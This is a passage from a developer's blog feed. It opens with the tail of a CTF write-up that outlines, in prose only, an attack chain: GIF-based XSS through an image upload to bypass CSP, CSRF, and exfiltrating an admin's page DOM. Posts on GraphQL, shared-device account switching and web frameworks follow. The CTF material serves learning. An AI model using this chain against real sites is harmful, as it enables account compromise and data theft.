&lt;li&gt;We can send messages to users&lt;/li&gt;
&lt;li&gt;We can inject images/etc in messages, but ContentSecurityPolicy blocks us from executing code from anywhere but self&lt;/li&gt;
&lt;li&gt;We can upload image files (can we make that other types?)

&lt;ul&gt;
&lt;li&gt;GIF89a based XSS, won&amp;#39;t exec in chrome though..&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Administrator will read messages we send them (check the &amp;#39;sent&amp;#39; page)&lt;/li&gt;
&lt;li&gt;Admin isn&amp;#39;t using chrome! :p&lt;/li&gt;
&lt;li&gt;The request doesn&amp;#39;t send us any cookies! :( (they&amp;#39;re HTTP only)&lt;/li&gt;
&lt;li&gt;CSRF token doesn&amp;#39;t seem to actually be validated.. What can we CSRF..?&lt;/li&gt;
&lt;li&gt;Use the XSS to send us the admin&amp;#39;s DOM&lt;/li&gt;
&lt;li&gt;Seems there&amp;#39;s an admin.php page..&lt;/li&gt;
&lt;li&gt;Ajax the admin page&lt;/li&gt;
&lt;li&gt;Success!&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;This CTF was a pretty fun little challenge, tying together XSS, CSP bypass, file upload/image abuse and snooping through the DOM.&lt;/p&gt;

&lt;p&gt;Has this helped you learn something new? Got a better way to approach it? I&amp;#39;d love to hear from you in the comments!&lt;/p&gt;

&lt;h2&gt;References&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Content Security Policy

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Content_Security_Policy&quot;&gt;Content Security Policy | OWASP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Content_Security_Policy_Cheat_Sheet&quot;&gt;Content Security Policy Cheat Sheet | OWASP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.html5rocks.com/en/tutorials/security/content-security-policy/&quot;&gt;&amp;quot;An Introduction to Content Security Policy&amp;quot; by HTML5 Rocks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://content-security-policy.com/&quot;&gt;Content Security Policy References and Examples&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;File Upload/Image XSS

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://blackpentesters.blogspot.com.au/2013/08/gif-image-xss.html&quot;&gt;&amp;quot;GIF Image XSS&amp;quot; by eXpl0i13r&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://brutelogic.com.br/blog/file-upload-xss/&quot;&gt;File Upload XSS | Hack2Learn&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/List_of_file_signatures&quot;&gt;List of File Signatures | Wikipedia&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/d0lph1n98/Defeating-PHP-GD-imagecreatefromgif&quot;&gt;&amp;quot;Exploiting PHP-GD imagecreatefromgif() function&amp;quot; by d0lph1n98 &lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Capturing Requests

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;TODO&quot;&gt;Request Bin&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>devalias</name></author><category term="hack" /><category term="ctf" /><category term="sectalks" /><category term="xss" /><category term="csrf" /><category term="file-upload" /><category term="image" /><category term="gif" /><category term="csp" /><category term="chrome" /><category term="safari" /><summary>I was playing around with the top challenge on the CTF at SecTalks the other night, and thought I&amp;#39;d do a quick writeup of some of the techniques required; for future reference, and to help others to learn.</summary></entry><entry><title>GraphQL: Why You Should Care</title><link href="http://devalias.net//devalias/2016/09/07/graphql-why-you-should-care/" rel="alternate" type="text/html" title="GraphQL: Why You Should Care" /><published>2016-09-07T00:00:00+10:00</published><updated>2016-09-07T00:00:00+10:00</updated><id>http://devalias.net//devalias/2016/09/07/graphql-why-you-should-care</id><content type="html" xml:base="http://devalias.net//devalias/2016/09/07/graphql-why-you-should-care/">&lt;p&gt;If you haven&amp;#39;t yet come across &lt;a href=&quot;http://graphql.org/&quot;&gt;GraphQL&lt;/a&gt;, it&amp;#39;s kind of exciting stuff. It&amp;#39;s a query language developed by &lt;a href=&quot;https://code.facebook.com/posts/&quot;&gt;Facebook&lt;/a&gt;, that basically lets you request exactly the data you need for the given task; no more, no less. Sounds good right?&lt;/p&gt;

&lt;h2&gt;Tell me more..&lt;/h2&gt;

&lt;p&gt;If you like to get into the nitty gritty of tech specs, you can head over to the &lt;a href=&quot;https://facebook.github.io/graphql/&quot;&gt;GraphQL Working Draft&lt;/a&gt; (&lt;a href=&quot;https://github.com/facebook/graphql&quot;&gt;GitHub&lt;/a&gt;) to have a deeper read, then play around with the &lt;a href=&quot;https://github.com/graphql/graphql-js&quot;&gt;reference implementation&lt;/a&gt; in JavaScript.&lt;/p&gt;

&lt;p&gt;Though if specs aren&amp;#39;t really your style, check out &amp;#39;&lt;a href=&quot;https://learngraphql.com/&quot;&gt;Learn GraphQL&lt;/a&gt;&amp;#39; and give their free short course a run through. Should get you up to speed!&lt;/p&gt;

&lt;h2&gt;Ok. I&amp;#39;m in!&lt;/h2&gt;

&lt;p&gt;Excited? Want to dive into it? Need libraries for your particular tech stack? Head on over to the &lt;a href=&quot;https://github.com/chentsulin/awesome-graphql&quot;&gt;Awesome GraphQL&lt;/a&gt; list. You&amp;#39;re bound to find what you need!&lt;/p&gt;

&lt;p&gt;For my particular tech palette I was after something &lt;a href=&quot;http://scala-lang.org/&quot;&gt;Scala&amp;#39;esque&lt;/a&gt;, maybe some &lt;a href=&quot;http://doc.akka.io/docs/akka/2.4/scala/http/&quot;&gt;Akka-HTTP&lt;/a&gt; to go with it. Seems I wasn&amp;#39;t the only one! &lt;a href=&quot;http://sangria-graphql.org/&quot;&gt;Sangria&lt;/a&gt; (&lt;a href=&quot;https://github.com/sangria-graphql/sangria&quot;&gt;GitHub&lt;/a&gt;) is a Scala GraphQL implementation. They even have &lt;a href=&quot;https://github.com/sangria-graphql/sangria-akka-http-example&quot;&gt;an Akka-HTTP based example&lt;/a&gt;. Perfect! Throw in a little &lt;a href=&quot;https://github.com/sangria-graphql/sangria-relay&quot;&gt;Relay support&lt;/a&gt; and this package is pretty much complete.&lt;/p&gt;

&lt;p&gt;If you&amp;#39;re looking for an all-in-one stack heading forward, I keep seeing a lot of good things posted by the team at &lt;a href=&quot;http://www.apollostack.com/&quot;&gt;Apollo Stack&lt;/a&gt; (by the &lt;a href=&quot;https://www.meteor.com/&quot;&gt;Meteor&lt;/a&gt; team), so would most definitely recommend keeping an eye on them. They also post a lot of really good articles &lt;a href=&quot;https://medium.com/apollo-stack&quot;&gt;on their blog&lt;/a&gt; too.&lt;/p&gt;

&lt;p&gt;For some further reading, make sure to check out:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://medium.com/apollo-stack/tutorial-building-a-graphql-server-cddaa023c035&quot;&gt;&amp;quot;Tutorial: How to build a GraphQL server&amp;quot; by Jonas Helfer&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;&lt;a name=&quot;graphql-relay-redux&quot;&gt;&lt;/a&gt;GraphQL and Relay.. What about Redux?&lt;/h2&gt;

&lt;p&gt;A lot of things you&amp;#39;ll read about GraphQL on the net will talk about it quite closely with &lt;a href=&quot;https://facebook.github.io/relay/&quot;&gt;Relay&lt;/a&gt;, and given they were both released by Facebook, and sort of designed to work together, it makes a lot of sense. That said, you most definitely don&amp;#39;t need to use Relay to take advantage of the awesomeness GraphQL provides!&lt;/p&gt;

&lt;p&gt;KADIRA states it pretty well in &lt;a href=&quot;https://kadira.io/blog/graphql/graphql-vs-relay&quot;&gt;GraphQL vs Relay&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;GraphQL provides a way to model and expose data in your app. You can use it on top of any kind of data source and use it with any kind of transport layer.&lt;/p&gt;

&lt;p&gt;Relay is an efficient client-side data-fetching technology built for React. It talks to a GraphQL Schema to get data. Relay also has a server-side part that adds some features on top of GraphQL.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;There is a bunch of talk about how Relay is currently a pain to use, but Facebook seems to be &lt;a href=&quot;https://facebook.github.io/react/blog/2016/08/05/relay-state-of-the-state.html&quot;&gt;well aware of this issue&lt;/a&gt; and has future plans to make it much nicer to work with.&lt;/p&gt;

&lt;p&gt;I think it&amp;#39;s definitely worth keeping an eye on Relay in the future, but if you&amp;#39;re not quite ready to jump in, you can always take advantage of the benefits of GraphQL while sticking to something like &lt;a href=&quot;http://redux.js.org/&quot;&gt;Redux&lt;/a&gt; (&lt;a href=&quot;https://github.com/reactjs/redux&quot;&gt;GitHub&lt;/a&gt;). For further reading:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.reindex.io/blog/redux-and-relay/&quot;&gt;&amp;quot;Comparing Redux and Relay&amp;quot; by Mikhail Novikov&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://medium.com/@matt.krick/replacing-relay-with-redux-2990c81aa807&quot;&gt;&amp;quot;Replacing Relay with Redux&amp;quot; by Matt Krick&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://medium.com/@thisbejim/getting-started-with-redux-and-graphql-8384b3b25c56&quot;&gt;&amp;quot;Getting started with Redux and GraphQL&amp;quot; by James Childs-Maidment&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.apollostack.com/&quot;&gt;Apollo Stack&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/mattkrick/cashay&quot;&gt;Cashay&lt;/a&gt;: &amp;quot;Relay for the rest of us&amp;quot;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/gyzerok/adrenaline&quot;&gt;Adrenaline&lt;/a&gt;: &amp;quot;Simple Relay alternative&amp;quot;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/kennetpostigo/react-reach&quot;&gt;React-Reach&lt;/a&gt;: &amp;quot;A small library for React to communicate with GraphQL&amp;quot;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;GraphQL vs Falcor&lt;/h2&gt;

&lt;p&gt;So by now we should have a fairly good idea about what &lt;a href=&quot;http://graphql.org/&quot;&gt;GraphQL&lt;/a&gt; is. So what&amp;#39;s &lt;a href=&quot;http://netflix.github.io/falcor/&quot;&gt;Falcor&lt;/a&gt;? This one comes from our friends over at &lt;a href=&quot;http://techblog.netflix.com/&quot;&gt;Netflix&lt;/a&gt;. In essence, it turns all of your data sources into one giant JSON graph. Regardless of whether you&amp;#39;re loading data remotely, have it cached locally, etc; you&amp;#39;ll access it in the same way.&lt;/p&gt;

&lt;p&gt;If you want to read deeper, I found these to be quite useful:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://stackoverflow.com/questions/32057785/what-is-the-difference-between-falcor-and-graphql&quot;&gt;&amp;quot;What is the difference between Falcor and GraphQL?&amp;quot; on StackOverflow&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://medium.com/apollo-stack/graphql-vs-falcor-4f1e9cbf7504&quot;&gt;&amp;quot;GraphQL vs. Falcor&amp;quot; by Jonas Helfer&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://react-etc.net/entry/beyond-rest-graphql-vs-falcor&quot;&gt;&amp;quot;Beyond REST: GraphQL vs. Falcor&amp;quot; by React-Etc&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The consensus that I came to is that it seems to be on par with GraphQL in a number of ways, but is probably a bit easier to implement and a bit less powerful overall. Apparently you could even go so far as to &lt;a href=&quot;http://hueypetersen.com/posts/2015/10/26/querying-graphql-with-falcor/&quot;&gt;query GraphQL with Falcor&lt;/a&gt;, but not the other way. For my purposes, I think I&amp;#39;ll be sticking with GraphQL.&lt;/p&gt;

&lt;p&gt;It&amp;#39;s also worth noting that Facebook has been using various flavours of GraphQL for a few years now, whereas Netflix is yet to (or has only recently) started using Falcor in production.&lt;/p&gt;

&lt;h2&gt;API&amp;#39;s: REST, HATEOS, Observables.. GraphQL!&lt;/h2&gt;

&lt;p&gt;I have read SO many articles over the years about the &amp;#39;proper&amp;#39; way to design API&amp;#39;s, and why styleX is so much better than styleY. With so much info out there, and so much conflicting advice (even within each supposed style), it&amp;#39;s really easy to get stuck in analysis paralysis.&lt;/p&gt;

&lt;p&gt;Greg Ziegan put together a &lt;a href=&quot;https://medium.com/@gregoryziegan/how-graphql-taught-me-to-code-client-apps-1c631a9953bd&quot;&gt;nice little article&lt;/a&gt; talking about his progression along this path: from REST, through &lt;a href=&quot;http://timelessrepo.com/haters-gonna-hateoas&quot;&gt;HATEOS&lt;/a&gt;, observables, etc; and how he ended up at GraphQL. Following on from this, Sashko Stubailo makes a pretty good argument about why GraphQL is &lt;a href=&quot;https://medium.com/apollo-stack/graphql-the-next-generation-of-api-design-f24b1689756a&quot;&gt;&amp;quot;the next generation of API design&amp;quot;&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;While the benefits of a GraphQL-based API seem pretty obvious to me, it&amp;#39;s not always feasible to jump straight into shiny new tech. Maybe you need to support legacy services, interact with 3rd-party API&amp;#39;s, or allow other developers to consume your API without them having to learn the ins and outs of GraphQL. But thankfully, we don&amp;#39;t need to pick one over the other!&lt;/p&gt;

&lt;p&gt;The GraphQL team have a pretty good article on their blog about &lt;a href=&quot;http://graphql.org/blog/rest-api-graphql-wrapper/&quot;&gt;wrapping REST API&amp;#39;s in GraphQL&lt;/a&gt;, starting purely with the client-side, and later moving it to the backend. This idea plays in SO well with some little side-projects I&amp;#39;ve been thinking about over the years, and how it could be used to help decompose and combine existing API&amp;#39;s.&lt;/p&gt;

&lt;h2&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;This is a scattering of the articles and things I have read through while learning more about GraphQL, and why it is so awesome. I definitely know it&amp;#39;s a technology that I am super excited to start utilising in my future projects.&lt;/p&gt;

&lt;p&gt;Have you come across any other awesome articles/tools related to GraphQL or similar? I&amp;#39;d love to hear about them! Let me know in the comments below.&lt;/p&gt;</content><author><name>devalias</name></author><category term="dev" /><category term="web" /><category term="tech-stack" /><category term="graphql" /><category term="relay" /><category term="redux" /><category term="cashay" /><category term="adrenaline" /><category term="sangria" /><category term="scala" /><category term="akka" /><category term="akka-http" /><category term="apollo-stack" /><category term="falcor" /><category term="rest" /><category term="hateos" /><category term="facebook" /><category term="netflix" /><summary>If you haven&amp;#39;t yet come across GraphQL, it&amp;#39;s kind of exciting stuff. It&amp;#39;s a query language developed by Facebook, that basically lets you request exactly the data you need for the given task; no more, no less. Sounds good right?</summary></entry><entry><title>Shared Devices Need Account Switching</title><link href="http://devalias.net//devalias/2016/08/31/shared-devices-need-account-switching/" rel="alternate" type="text/html" title="Shared Devices Need Account Switching" /><published>2016-08-31T00:00:00+10:00</published><updated>2016-08-31T00:00:00+10:00</updated><id>http://devalias.net//devalias/2016/08/31/shared-devices-need-account-switching</id><content type="html" xml:base="http://devalias.net//devalias/2016/08/31/shared-devices-need-account-switching/">&lt;p&gt;Living in share houses and using tech like the Apple TV has highlighted an annoying situation: so many apps these days want you to sign in to enable access, personalised features, etc; but most offer no good solution for when you share the device with other people.&lt;/p&gt;

&lt;p&gt;There are some apps out there that handle this pretty well:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.plex.tv/&quot;&gt;Plex&lt;/a&gt; allows you to switch between different users in your &amp;#39;home&amp;#39;, each of which can either be a fully independent account, or a &amp;#39;managed user&amp;#39; that exists under the main account.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.netflix.com/au/&quot;&gt;Netflix&lt;/a&gt; allows switching between different users under the one subscription. While this is ok.. it doesn&amp;#39;t work so well for a share house. What if we each have our own Netflix subscriptions, but want to share the device without having to log out and back in to our own accounts?&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;And then there are so many apps that don&amp;#39;t even seem to give the option, two of which immediately jump to mind for me:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.youtube.com/&quot;&gt;YouTube&lt;/a&gt; let&amp;#39;s you sign in to a single account, but no switching features save for logging out.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.ted.com/&quot;&gt;TED&lt;/a&gt;&amp;#39;s app suffers from the same issue.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This could be fixed at the individual app level. It would be REALLY nice to see support for multiple account switching added to any app made for a device that could potentially be shared (Apple TV/etc, far less likely to be useful on an iPhone.. but it might be for some users) But this requires extra effort from every app developer out there. Perhaps a common framework could be developed to help support this.. but then making it generic enough to fit into everyone&amp;#39;s different architectures would be a challenge.&lt;/p&gt;

&lt;p&gt;An even better solution could be baked into the OS itself by Apple.. I boot up my Apple TV and am presented with an account chooser asking which particular registered user I am. If I haven&amp;#39;t already logged in, there&amp;#39;s the option for signing in to my Apple account to add myself as a new user. Once logged in, I&amp;#39;m presented with my own homescreen of apps, laid out to my own preferences, logged in to my own accounts, and saving my own personal data.&lt;/p&gt;

&lt;p&gt;This poses some issues about duplication of apps between users, space requirements, etc. So a mid-ground could be allowing the owner/&amp;#39;master&amp;#39; user to control app installation, but then for each other user to be able to maintain their own stored data/signin status/etc.&lt;/p&gt;

&lt;p&gt;What do you think? Is this a feature you&amp;#39;d use, or does it just seem like over-engineered bloat? Let me know your thoughts in the comments!&lt;/p&gt;</content><author><name>devalias</name></author><category term="dev" /><category term="tech" /><category term="apple" /><category term="apple-tv" /><category term="tvOS" /><category term="iOS" /><category term="personalisation" /><category term="improvements" /><category term="plex" /><category term="netflix" /><category term="youtube" /><category term="ted" /><summary>Living in share houses and using tech like the Apple TV has highlighted an annoying situation: so many apps these days want you to sign in to enable access, personalised features, etc; but most offer no good solution for when you share the device with other people.</summary></entry><entry><title>Starting a New Web Application (Part 1): An Exploration of Options</title><link href="http://devalias.net//devalias/2016/08/24/starting-a-new-web-application-1-an-exploration-of-options/" rel="alternate" type="text/html" title="Starting a New Web Application (Part 1): An Exploration of Options" /><published>2016-08-24T00:00:00+10:00</published><updated>2016-08-24T00:00:00+10:00</updated><id>http://devalias.net//devalias/2016/08/24/starting-a-new-web-application-1-an-exploration-of-options</id><content type="html" xml:base="http://devalias.net//devalias/2016/08/24/starting-a-new-web-application-1-an-exploration-of-options/">&lt;p&gt;Finding myself with some free time (and looking into starting a new project), I thought I might catch myself up on the state of web technologies, and what might be a good stack to work with.&lt;/p&gt;

&lt;p&gt;The details collected here are most certainly not a complete layout of the entire landscape, and there will no doubt be leanings toward my personal tastes (&lt;a href=&quot;http://www.reactivemanifesto.org/&quot;&gt;reactive&lt;/a&gt;, api-driven, etc). You should use this more as a starter into your own deeper research than as a source of ultimate truth. With that out of the way, let&amp;#39;s get into it!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Quicklinks&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#frontend&quot;&gt;Frontend&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#frontend-frameworks&quot;&gt;Frameworks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#frontend-ui&quot;&gt;UI&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#frontend-scripting&quot;&gt;Scripting&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#backend&quot;&gt;Backend&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#tooling&quot;&gt;Tooling&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conclusions&quot;&gt;Conclusions&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;&lt;a name=&quot;frontend&quot;&gt;&lt;/a&gt;Frontend&lt;/h2&gt;

&lt;p&gt;The frontend is the pretty, interactive, main part that people will be seeing. You can have the most amazingly streamlined and perfect backend code, but noone&amp;#39;s going to notice and love it without a strong frontend to back it up.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a name=&quot;frontend-frameworks&quot;&gt;&lt;/a&gt;Frameworks&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The days of raw JavaScript and jQuery selectors is long gone. We&amp;#39;re looking for a nice, modern framework to help put together our frontend. Here&amp;#39;s a little selection of some of our options:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://facebook.github.io/react/&quot;&gt;React&lt;/a&gt; (&lt;a href=&quot;https://github.com/reactjs&quot;&gt;GitHub&lt;/a&gt;) (most likely with a flavour of &lt;a href=&quot;https://facebook.github.io/flux/&quot;&gt;Flux&lt;/a&gt; (&lt;a href=&quot;https://github.com/facebook/flux&quot;&gt;GitHub&lt;/a&gt;))

&lt;ul&gt;
&lt;li&gt;A frontend framework from Facebook that is taking the web by storm. Probably my personal favourite from what I&amp;#39;ve seen so far.&lt;/li&gt;
&lt;li&gt;It even let&amp;#39;s you &lt;a href=&quot;https://facebook.github.io/react-native/&quot;&gt;build for native devices&lt;/a&gt;!&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://angular.io/&quot;&gt;Angular (v2)&lt;/a&gt; (or if you like outdated for some reason &lt;a href=&quot;https://angularjs.org/&quot;&gt;AngularJS (v1)&lt;/a&gt;)

&lt;ul&gt;
&lt;li&gt;Also &lt;a href=&quot;https://mobile.angular.io/&quot;&gt;available for native devices&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;I was a big fan of AngularJS (v1), and I want to like v2, but I don&amp;#39;t think it will be my main choice.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;There are a TON of other frontend frameworks, of varying popularity and support. I won&amp;#39;t delve into them much, but there&amp;#39;s heaps of info out there

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://emberjs.com/&quot;&gt;Ember&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://vuejs.org/&quot;&gt;Vue.js&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;From reading around the web, there&amp;#39;s a decent amount of good stuff talking about Vue. In the end I decided against it since it&amp;#39;s not supported by a big backer, and the skills aren&amp;#39;t as useful on a resume. That said, for a personal project it could be a great fit!&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://vuejs.org/guide/comparison.html&quot;&gt;https://vuejs.org/guide/comparison.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://blog.evanyou.me/2015/10/25/vuejs-re-introduction/&quot;&gt;http://blog.evanyou.me/2015/10/25/vuejs-re-introduction/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://vuejs.org/2016/04/27/announcing-2.0/&quot;&gt;http://vuejs.org/2016/04/27/announcing-2.0/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/vuejs/vue&quot;&gt;vue&lt;/a&gt;, &lt;a href=&quot;https://github.com/vuejs/vue-rx&quot;&gt;vue-rx&lt;/a&gt;, &lt;a href=&quot;https://github.com/vuejs/vue-resource&quot;&gt;vue-resource&lt;/a&gt;, &lt;a href=&quot;https://github.com/vuejs/vue-router&quot;&gt;vue-router&lt;/a&gt;, &lt;a href=&quot;https://github.com/vuejs/vuex&quot;&gt;vuex&lt;/a&gt;, &lt;a href=&quot;https://github.com/revue/revue&quot;&gt;revuew&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://aurelia.io/&quot;&gt;Aurelia&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://riotjs.com/&quot;&gt;Riot&lt;/a&gt; (&lt;a href=&quot;https://muut.com/blog/technology/riot-2.0/&quot;&gt;v2&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As with most things, every man and his dog has their own opinion, so here are a few comparisons I found useful:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.ociweb.com/resources/publications/sett/comparison-of-angular-2-and-react/&quot;&gt;&amp;quot;Comparison of Angular 2 and React&amp;quot; by Mark Volkmann and Lance Finney&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://blog.backand.com/angular-2-vs-react/&quot;&gt;&amp;quot;Angular 2 vs. React&amp;quot; by Itay Herskovits&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://medium.freecodecamp.com/angular-2-versus-react-there-will-be-blood-66595faafd51&quot;&gt;&amp;quot;Angular 2 versus React: There Will Be Blood&amp;quot; by Cory House&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://rlafranchi.github.io/2016/05/03/vue-vs-react/&quot;&gt;&amp;quot;Vue.js vs React.js&amp;quot; by Richard LaFranchi&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://forums.meteor.com/t/why-doesnt-mdg-just-adopt-vue-js-and-forget-about-react-vs-blaze/13926/6&quot;&gt;&amp;quot;Why doesnâ€™t MDG just adopt Vue.js and forget about React vs Blaze?&amp;quot;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;&lt;a name=&quot;frontend-ui&quot;&gt;&lt;/a&gt;UI&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Even if you like to go oldschool and code your site by hand in notepad/vi, you can&amp;#39;t deny the ease/benefits of using a frontend UI framework.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://getbootstrap.com/&quot;&gt;Bootstrap&lt;/a&gt; (&lt;a href=&quot;https://blog.getbootstrap.com/2015/08/19/bootstrap-4-alpha/&quot;&gt;v4&lt;/a&gt;)

&lt;ul&gt;
&lt;li&gt;Released by Twitter, and arguably one of the most used frontend UI frameworks out there.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://react-bootstrap.github.io/&quot;&gt;React-Bootstrap&lt;/a&gt; (&lt;a href=&quot;https://github.com/react-bootstrap/react-bootstrap&quot;&gt;GitHub&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://ng-bootstrap.github.io/#/home&quot;&gt;ng-bootstrap&lt;/a&gt; by the angular-ui team (&lt;a href=&quot;https://github.com/ng-bootstrap/ng-bootstrap&quot;&gt;GitHub&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://valor-software.com/ng2-bootstrap/&quot;&gt;ng2-bootstrap&lt;/a&gt; by valor-software (&lt;a href=&quot;https://github.com/valor-software/ng2-bootstrap&quot;&gt;GitHub&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://foundation.zurb.com/&quot;&gt;Foundation&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;While not as well known as the other two mentioned here, those that make use of foundation swear by it.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://react.foundation/&quot;&gt;React-Foundation&lt;/a&gt; (&lt;a href=&quot;https://github.com/nordsoftware/react-foundation&quot;&gt;GitHub&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://aruberto.github.io/react-foundation-components/&quot;&gt;React-Foundation-Components&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://material.google.com/&quot;&gt;Material Design&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Following a set of design principals from Google, this lays out a slick, consistent look and feel.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://getmdl.io/&quot;&gt;Material Design Lite&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.material-ui.com/&quot;&gt;For React&lt;/a&gt; (&lt;a href=&quot;https://github.com/callemall/material-ui&quot;&gt;GitHub&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://material.angular.io/&quot;&gt;For Angular (v2)&lt;/a&gt; (&lt;a href=&quot;https://github.com/angular/material2&quot;&gt;GitHub&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://material.angularjs.io/&quot;&gt;For AngularJS (v1)&lt;/a&gt; (&lt;a href=&quot;https://github.com/angular/material&quot;&gt;GitHub&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Can&amp;#39;t decide? Try some comparisons:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://blog.teamtreehouse.com/the-rundown-bootstrap-vs-google-mdl-vs-foundation&quot;&gt;&amp;quot;The Rundown: Bootstrap vs. Google MDL vs. Foundation&amp;quot; by treehouse&lt;/a&gt;&lt;/li&gt;
